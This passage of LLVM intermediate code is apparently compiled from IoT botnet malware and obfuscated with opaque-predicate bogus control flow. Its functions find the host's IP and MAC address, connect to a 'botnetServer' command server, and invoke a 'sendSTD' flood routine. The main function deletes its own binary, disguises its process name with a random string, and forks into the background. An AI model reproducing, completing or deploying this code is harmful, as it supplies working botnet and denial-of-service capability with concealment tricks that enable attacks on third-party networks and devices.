originalBB102alteredBB:                           ; preds = %originalBB102, %873
  %1181 = load i8**, i8*** %4, align 8
  %1182 = getelementptr inbounds i8*, i8** %1181, i64 2
  %1183 = load i8*, i8** %1182, align 8
  %1184 = call i32 @atoi(i8* %1183) #9
  %1185 = icmp slt i32 %1184, 1
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %895
  %1186 = load i8**, i8*** %4, align 8
  %1187 = getelementptr inbounds i8*, i8** %1186, i64 3
  %1188 = load i8*, i8** %1187, align 8
  %1189 = call i32 @atoi(i8* %1188) #9
  %1190 = icmp slt i32 %1189, 1
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %917
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %949
  %1191 = load i8*, i8** %25, align 8
  %1192 = call i8* @strtok(i8* %1191, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %1192, i8** %28, align 8
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %978
  %1193 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %1193, i8** %28, align 8
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1001
  %1194 = load i8*, i8** %25, align 8
  %1195 = load i32, i32* %26, align 4
  %1196 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %1194, i32 %1195, i32 %1196)
  call void @_exit(i32 0) #12
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1021
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1038
  %1197 = load i8**, i8*** %4, align 8
  %1198 = getelementptr inbounds i8*, i8** %1197, i64 0
  %1199 = load i8*, i8** %1198, align 8
  %1200 = call i32 @strcmp(i8* %1199, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.136, i32 0, i32 0)) #9
  %1201 = icmp ne i32 %1200, 0
  br label %originalBB130
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %181

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0)) #3
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #10
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %181

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #3
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %181

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.138, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %79, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %81

; <label>:47:                                     ; preds = %42
  %48 = load i32, i32* @x.105
  %49 = load i32, i32* @y.106
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %47
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %57 = call i8* @strstr(i8* %56, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.139, i32 0, i32 0)) #9
  %58 = icmp ne i8* %57, null
  %59 = load i32, i32* @x.105
  %60 = load i32, i32* @y.106
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %79

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %68, i8** %9, align 8
  br label %69

; <label>:69:                                     ; preds = %74, %67
  %70 = load i8*, i8** %9, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 9
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %9, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %9, align 8
  br label %69

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %9, align 8
  store i8 0, i8* %78, align 1
  br label %81

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:81:                                     ; preds = %77, %42
  %82 = load i32, i32* @x.105
  %83 = load i32, i32* @y.106
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %81
  %90 = load i32, i32* %7, align 4
  %91 = call i32 @close(i32 %90)
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %93 = load i8, i8* %92, align 16
  %94 = icmp ne i8 %93, 0
  %95 = load i32, i32* @x.105
  %96 = load i32, i32* @y.106
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %94, label %103, label %162

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = load i32, i32* @x.105
  %105 = load i32, i32* @y.106
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  %112 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %113 = bitcast %union.anon.4* %112 to [16 x i8]*
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %113, i32 0, i32 0
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %116 = call i8* @strcpy(i8* %114, i8* %115) #3
  %117 = load i32, i32* %2, align 4
  %118 = call i32 (i32, i64, ...) @ioctl(i32 %117, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  %119 = load i32, i32* @x.105
  %120 = load i32, i32* @y.106
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %127

; <label>:127:                                    ; preds = %142, %originalBBpart28
  %128 = load i32, i32* %10, align 4
  %129 = icmp slt i32 %128, 6
  br i1 %129, label %130, label %145

; <label>:130:                                    ; preds = %127
  %131 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %132 = bitcast %union.anon.5* %131 to %struct.sockaddr*
  %133 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %132, i32 0, i32 1
  %134 = getelementptr inbounds [14 x i8], [14 x i8]* %133, i32 0, i32 0
  %135 = load i32, i32* %10, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = load i8, i8* %137, align 1
  %139 = load i32, i32* %10, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %140
  store i8 %138, i8* %141, align 1
  br label %142

; <label>:142:                                    ; preds = %130
  %143 = load i32, i32* %10, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %10, align 4
  br label %127

; <label>:145:                                    ; preds = %127
  %146 = load i32, i32* @x.105
  %147 = load i32, i32* @y.106
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* @x.105
  %155 = load i32, i32* @y.106
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %162

; <label>:162:                                    ; preds = %originalBBpart212, %originalBBpart24
  %163 = load i32, i32* @x.105
  %164 = load i32, i32* @y.106
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %162
  %171 = load i32, i32* %2, align 4
  %172 = call i32 @close(i32 %171)
  %173 = load i32, i32* @x.105
  %174 = load i32, i32* @y.106
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %181

; <label>:181:                                    ; preds = %originalBBpart216, %36, %29, %15
  %182 = load i32, i32* %1, align 4
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %47
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %184 = call i8* @strstr(i8* %183, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.139, i32 0, i32 0)) #9
  %185 = icmp ne i8* %184, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %81
  %186 = load i32, i32* %7, align 4
  %187 = call i32 @close(i32 %186)
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %189 = load i8, i8* %188, align 16
  %190 = icmp ne i8 %189, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  %191 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %192 = bitcast %union.anon.4* %191 to [16 x i8]*
  %193 = getelementptr inbounds [16 x i8], [16 x i8]* %192, i32 0, i32 0
  %194 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %195 = call i8* @strcpy(i8* %193, i8* %194) #3
  %196 = load i32, i32* %2, align 4
  %197 = call i32 (i32, i64, ...) @ioctl(i32 %196, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %162
  %198 = load i32, i32* %2, align 4
  %199 = call i32 @close(i32 %198)
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %33 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %31
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.140 to i32), i32* %1, align 4
  br label %34

; <label>:14:                                     ; preds = %0
  %15 = load i32, i32* @x.107
  %16 = load i32, i32* @y.108
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.141 to i32), i32* %1, align 4
  %23 = load i32, i32* @x.107
  %24 = load i32, i32* @y.108
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:31:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.142 to i32), i32* %1, align 4
  br label %34

; <label>:32:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.143 to i32), i32* %1, align 4
  br label %34

; <label>:33:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.144 to i32), i32* %1, align 4
  br label %34

; <label>:34:                                     ; preds = %33, %32, %31, %originalBBpart2, %13
  %35 = load i32, i32* @x.107
  %36 = load i32, i32* @y.108
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @x.107
  %45 = load i32, i32* @y.108
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %43

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.141 to i32), i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %52 = load i32, i32* %1, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = load i32, i32* @x.109
  %2 = load i32, i32* @y.110
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 4096, i32 16, i1 false)
  %13 = load i32, i32* @KadenCommStock, align 4
  %14 = icmp ne i32 %13, 0
  %15 = load i32, i32* @x.109
  %16 = load i32, i32* @y.110
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @KadenCommStock, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* @KadenCommStock, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* @x.109
  %28 = load i32, i32* @y.110
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* @botnetServer, align 4
  %36 = add nsw i32 %35, 1
  %37 = sext i32 %36 to i64
  %38 = icmp eq i64 %37, 1
  %39 = load i32, i32* @x.109
  %40 = load i32, i32* @y.110
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br i1 %38, label %47, label %64

; <label>:47:                                     ; preds = %originalBBpart29
  %48 = load i32, i32* @x.109
  %49 = load i32, i32* @y.110
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %47
  store i32 0, i32* @botnetServer, align 4
  %56 = load i32, i32* @x.109
  %57 = load i32, i32* @y.110
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %67

; <label>:64:                                     ; preds = %originalBBpart29
  %65 = load i32, i32* @botnetServer, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* @botnetServer, align 4
  br label %67

; <label>:67:                                     ; preds = %64, %originalBBpart213
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %69 = load i32, i32* @botnetServer, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %70
  %72 = load i8*, i8** %71, align 8
  %73 = call i8* @strcpy(i8* %68, i8* %72) #3
  store i32 282, i32* %11, align 4
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %75 = call i8* @strchr(i8* %74, i32 58) #9
  %76 = icmp ne i8* %75, null
  br i1 %76, label %77, label %100

; <label>:77:                                     ; preds = %67
  %78 = load i32, i32* @x.109
  %79 = load i32, i32* @y.110
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %77
  %86 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %87 = call i8* @strchr(i8* %86, i32 58) #9
  %88 = getelementptr inbounds i8, i8* %87, i64 1
  %89 = call i32 @atoi(i8* %88) #9
  store i32 %89, i32* %11, align 4
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %91 = call i8* @strchr(i8* %90, i32 58) #9
  store i8 0, i8* %91, align 1
  %92 = load i32, i32* @x.109
  %93 = load i32, i32* @y.110
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %100

; <label>:100:                                    ; preds = %originalBBpart217, %67
  %101 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %101, i32* @KadenCommStock, align 4
  %102 = load i32, i32* @KadenCommStock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %104 = load i32, i32* %11, align 4
  %105 = call i32 @connectTimeout(i32 %102, i8* %103, i32 %104, i32 30)
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %108, label %107

; <label>:107:                                    ; preds = %100
  store i32 1, i32* %9, align 4
  br label %109

; <label>:108:                                    ; preds = %100
  store i32 0, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* %9, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %0
  %111 = alloca i32, align 4
  %112 = alloca [4096 x i8], align 16
  %113 = alloca i32, align 4
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %112, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 4096, i32 16, i1 false)
  %115 = load i32, i32* @KadenCommStock, align 4
  %116 = icmp ne i32 %115, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %117 = load i32, i32* @botnetServer, align 4
  %_ = shl i32 %117, 1
  %_2 = shl i32 %117, 1
  %_3 = sub i32 %117, 1
  %gen = mul i32 %_3, 1
  %_4 = sub i32 %117, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 %117, 1
  %gen7 = mul i32 %_6, 1
  %118 = add nsw i32 %117, 1
  %119 = sext i32 %118 to i64
  %120 = icmp eq i64 %119, 1
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %47
  store i32 0, i32* @botnetServer, align 4
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %77
  %121 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %122 = call i8* @strchr(i8* %121, i32 58) #9
  %123 = getelementptr inbounds i8, i8* %122, i64 1
  %124 = call i32 @atoi(i8* %123) #9
  store i32 %124, i32* %11, align 4
  %125 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %126 = call i8* @strchr(i8* %125, i32 58) #9
  store i8 0, i8* %126, align 1
  br label %originalBB15
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @unlink(i8* %27) #3
  call void @rand_init()
  %29 = call i32 @rand_next()
  %30 = urem i32 %29, 4
  %31 = add i32 %30, 3
  %32 = mul i32 %31, 4
  store i32 %32, i32* %8, align 4
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %34 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %33, i32 %34)
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %42 = call i32 @util_strcpy(i8* %40, i8* %41)
  %43 = call i32 @rand_next()
  %44 = urem i32 %43, 6
  %45 = add i32 %44, 3
  %46 = mul i32 %45, 4
  store i32 %46, i32* %8, align 4
  %47 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %48 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %47, i32 %48)
  %49 = load i32, i32* %8, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %50
  store i8 0, i8* %51, align 1
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %53 = call i32 (i32, ...) @prctl(i32 15, i8* %52) #3
  %54 = call i64 @time(i64* null) #3
  %55 = call i32 @getpid() #3
  %56 = sext i32 %55 to i64
  %57 = xor i64 %54, %56
  %58 = trunc i64 %57 to i32
  call void @srand(i32 %58) #3
  call void @rand_init()
  %59 = call i32 @getOurIP()
  %60 = call i32 @fork() #3
  store i32 %60, i32* %9, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %2
  %63 = load i32, i32* %9, align 4
  %64 = call i32 @waitpid(i32 %63, i32* %11, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:65:                                     ; preds = %2
  %66 = load i32, i32* @x.111
  %67 = load i32, i32* @y.112
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %65
  %74 = load i32, i32* %9, align 4
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.111
  %77 = load i32, i32* @y.112
  %78 = sub i32 %76, 1
